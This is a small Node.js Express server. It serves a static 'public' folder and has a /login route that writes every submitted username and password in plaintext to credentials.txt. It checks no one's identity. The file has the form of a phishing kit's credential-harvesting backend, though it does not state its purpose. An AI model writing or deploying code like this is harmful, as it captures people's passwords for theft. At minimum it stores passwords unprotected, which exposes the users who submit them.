const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const credentials = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('credentials.txt', credentials, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error saving credentials');
        } else {
            res.status(200).send('Credentials saved');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
